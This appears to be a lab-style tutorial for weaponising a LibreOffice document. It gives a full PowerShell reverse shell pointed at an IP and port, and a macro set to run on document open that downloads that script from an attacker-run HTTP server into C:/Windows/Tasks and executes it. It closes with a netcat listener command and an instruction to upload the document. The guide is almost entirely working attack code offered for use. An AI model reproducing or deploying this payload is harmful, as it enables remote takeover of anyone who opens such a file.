- - -
## Step by Step : 

```sh
sudo apt install -y libreoffice
```

##### On Terminal 1 : 

```sh
touch offsec.ps1
```

```
nano offsec.ps1 
```

Now, Enter your <mark style="background: #FF5582A6;">IP</mark> and <mark style="background: #FFB86CA6;">port</mark> For listening. And Note **That their Should be no new Line in the below code!!!**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```sh
chmod 755 offsec.ps1
```

#### On Terminal 2 :

```sh
libreoffice
```

Now Click On :
```
writer document →
	tools →
		macros →
			organise macros →
				basic →
					untitled →
						new → 
							<givename> →
								OK .
```

New window appers. on the right side something written like code.
write your code between ‘**Sub Main**’ and ‘**End Sub**’.

```odt
Sub main  
	shell("cmd /c powershell iwr http://<out-IP>:80/offsec.ps1  -o C:/Windows/Tasks/offsec.ps1")  
	shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")  
End Sub
```

Now Click On : 
```
File →
	save →
		offsec1 →
			Save.
```

Close the window.

Now move **back to Libre-office**. Now Click On : 
```
tools →
	customise →
		Open Document →
			Macro →
				offsec2.odt →
					<click the sub option> →
						offsec2 ( main on right side.) →
							OK →
								File →
									Save.
```

Close the Libe-Office.

### On Terminal 3 :

```python
python3 -m http.server 80
```

### On Terminal 4 :

```sh
nc -nvlp <your_port>
```

<mark style="background: #FFF3A3A6;">Now Go And Upload ‘offsec2.odt’</mark>

